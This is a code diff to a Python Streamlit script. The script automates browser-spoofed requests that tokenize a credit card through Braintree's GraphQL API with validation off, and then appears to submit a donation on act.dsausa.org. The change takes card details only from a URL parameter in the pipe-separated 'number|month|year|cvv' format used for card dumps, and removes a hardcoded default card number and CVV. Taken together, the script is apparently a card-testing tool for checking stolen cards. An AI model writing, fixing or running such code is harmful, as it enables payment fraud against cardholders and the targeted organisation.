@@ -106,9 +106,9 @@ if __name__ == "__main__":
             st.success("Successfully parsed card details from URL.")
             st.write("Using the following card details for Step 4:", card_details_from_url)
         else:
-            st.error("Invalid format for 'card' URL parameter. Expected cc|mm|yy_or_yyyy|cvv. Falling back to default card details for Step 4.")
-    else:
-        st.info("No 'card' URL parameter found. Using default card details for Step 4.")
+            st.error("Invalid format for 'card' URL parameter. Expected cc|mm|yy_or_yyyy|cvv.")
+            st.info("Please provide card details in the URL in the format: ?card=NUMBER|MONTH|YEAR|CVV to proceed.")
+    # No else here, card_details_from_url remains None if not provided or invalid
 
     # Example of how to store a value (will be replaced by actual extraction logic)
     # stored_values["example_token"] = "extracted_token_value"
@@ -244,87 +244,80 @@ if __name__ == "__main__":
 
     # --- Request 4 ---
     if 'authorizationFingerprint' in stored_values:
-        headers_step4 = {
-            'Host': 'payments.braintree-api.com',
-            # Content-Length is managed by requests library
-            'Sec-Ch-Ua-Platform': '"Windows"',
-            'Authorization': f"Bearer {stored_values['authorizationFingerprint']}", # Using stored value
-            'Braintree-Version': '2018-05-10',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Sec-Ch-Ua': '"Chromium";v="135", "Not-A.Brand";v="8"',
-            'Sec-Ch-Ua-Mobile': '?0',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
-            'Content-Type': 'application/json',
-            'Accept': '*/*',
-            'Origin': 'https://assets.braintreegateway.com',
-            'Sec-Fetch-Site': 'cross-site',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Dest': 'empty',
-            'Referer': 'https://assets.braintreegateway.com/',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Priority': 'u=1, i'
-            # Connection header is typically managed by requests library
-        }
+        if card_details_from_url: # Only proceed if card details were successfully parsed from URL
+            headers_step4 = {
+                'Host': 'payments.braintree-api.com',
+                'Sec-Ch-Ua-Platform': '"Windows"',
+                'Authorization': f"Bearer {stored_values['authorizationFingerprint']}", 
+                'Braintree-Version': '2018-05-10',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Sec-Ch-Ua': '"Chromium";v="135", "Not-A.Brand";v="8"',
+                'Sec-Ch-Ua-Mobile': '?0',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
+                'Content-Type': 'application/json',
+                'Accept': '*/*',
+                'Origin': 'https://assets.braintreegateway.com',
+                'Sec-Fetch-Site': 'cross-site',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Dest': 'empty',
+                'Referer': 'https://assets.braintreegateway.com/',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Priority': 'u=1, i'
+            }
 
-        # Use card details from URL if available, otherwise use hardcoded
-        current_card_details = {
-            "number": "4089119753861420", # Default
-            "expirationMonth": "12",       # Default
-            "expirationYear": "2025",      # Default
-            "cvv": "555"                  # Default
-        }
-        if card_details_from_url:
-            current_card_details = card_details_from_url
+            json_payload_step4 = {
+                "clientSdkMetadata": {
+                    "source": "client",
+                    "integration": "custom",
+                    "sessionId": "5cd5ee4d-a4c1-4ca4-a81d-ee23dc44e8b1"
+                },
+                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
+                "variables": {
+                    "input": {
+                        "creditCard": card_details_from_url, # Using dynamic card details from URL
+                        "options": {"validate": False}
+                    }
+                },
+                "operationName": "TokenizeCreditCard"
+            }
 
-        json_payload_step4 = {
-            "clientSdkMetadata": {
-                "source": "client",
-                "integration": "custom",
-                "sessionId": "5cd5ee4d-a4c1-4ca4-a81d-ee23dc44e8b1"
-            },
-            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
-            "variables": {
-                "input": {
-                    "creditCard": current_card_details, # Using dynamic card details
-                    "options": {"validate": False}
-                }
-            },
-            "operationName": "TokenizeCreditCard"
-        }
+            response_step4 = make_request(
+                step_number=4,
+                description="POST to Braintree GraphQL API to tokenize credit card",
+                method="POST",
+                url="https://payments.braintree-api.com/graphql",
+                headers=headers_step4,
+                json_data=json_payload_step4,
+                print_response_details=True 
+            )
 
-        response_step4 = make_request(
-            step_number=4,
-            description="POST to Braintree GraphQL API to tokenize credit card",
-            method="POST",
-            url="https://payments.braintree-api.com/graphql",
-            headers=headers_step4,
-            json_data=json_payload_step4,
-            print_response_details=True # Show full response for this step
-        )
-
-        if response_step4:
-            # Extract and store the tokenized card token
-            try:
-                response_json = response_step4.json()
-                tokenized_card_token = response_json.get('data', {}).get('tokenizeCreditCard', {}).get('token')
-                if tokenized_card_token:
-                    stored_values['card_token'] = tokenized_card_token
-                    st.write(f"Extracted card_token: {tokenized_card_token}")
-                else:
-                    st.warning("card_token not found in Step 4 response data.tokenizeCreditCard.token")
-            except json.JSONDecodeError:
-                st.error("Error: Step 4 response was not valid JSON, cannot extract card_token.")
-            except Exception as e:
-                st.error(f"Error extracting card_token from Step 4 response: {e}")
-            st.success("Step 4: Successfully completed.")
+            if response_step4:
+                try:
+                    response_json = response_step4.json()
+                    tokenized_card_token = response_json.get('data', {}).get('tokenizeCreditCard', {}).get('token')
+                    if tokenized_card_token:
+                        stored_values['card_token'] = tokenized_card_token
+                        st.write(f"Extracted card_token: {tokenized_card_token}")
+                    else:
+                        st.warning("card_token not found in Step 4 response data.tokenizeCreditCard.token")
+                except json.JSONDecodeError:
+                    st.error("Error: Step 4 response was not valid JSON, cannot extract card_token.")
+                except Exception as e:
+                    st.error(f"Error extracting card_token from Step 4 response: {e}")
+                st.success("Step 4: Successfully completed.")
+            else:
+                st.error("Step 4: Failed.")
         else:
-            st.error("Step 4: Failed.")
+            st.warning("Step 4 (Tokenize Card) & 5 (Donate): Skipped. Card details not provided or invalid in URL (?card=NUMBER|MONTH|YEAR|CVV).")
+            # Ensure card_token is not in stored_values if this path is taken, to prevent Step 5 trying to run with stale data
+            if 'card_token' in stored_values:
+                del stored_values['card_token']
     else:
-        st.warning("Step 4: Skipped because authorizationFingerprint was not found in stored_values.")
+        st.warning("Step 3 (Braintree Config) failed or authorizationFingerprint not found. Steps 4 & 5 skipped.")
     st.markdown("---")
 
     # --- Request 5 ---
-    if 'card_token' in stored_values:
+    if 'card_token' in stored_values: # This condition will now correctly reflect if Step 4 was successful
         headers_step5 = {
             'Host': 'act.dsausa.org',
             # Content-Length is managed by requests library
